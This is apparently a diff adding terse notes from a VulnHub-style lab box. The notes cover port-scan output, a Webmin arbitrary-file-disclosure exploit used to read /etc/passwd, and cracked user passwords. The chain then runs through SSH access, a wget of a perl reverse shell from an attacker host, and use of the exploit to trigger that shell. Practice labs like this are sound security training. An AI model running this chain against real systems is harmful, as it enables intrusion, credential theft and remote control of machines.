@@ -1,0 +1,30 @@
+# found running web service
+10000/tcp open  http    MiniServ 0.01 (Webmin httpd)
+
+# found corresponding exploit
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure  | multiple/remote/2017.pl
+
+# disclose files from the machine
+./2017.pl $IP 10000 /etc/passwd 0
+
+# crack hashes
+alice:loading1:501:501::/home/alice:/bin/bash
+bob:BUGZBUNNY:500:500::/home/bob:/bin/bash
+
+# access the box
+ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "KexAlgorithms=diffie-hellman-group-exchange-sha1" alice@$IP
+
+# reverse shell setup
+cp /usr/share/webshells/perl/perl-reverse-shell.pl ./
+nano perl-reverse-shell.pl # change ip and ports
+
+# download script
+wget http://192.168.119.201:9000/perl-reverse-shell.pl
+chmod +x perl-reverse-shell.pl
+mv perl-reverse-shell.pl rshell.cgi
+
+# setup listener and get shell by running 2017 script
+./2017.pl $IP 10000 /tmp/rshell.cgi 0
+
+# Ref
+https://netosec.com/pwnos-vulnhub-walkthrough/
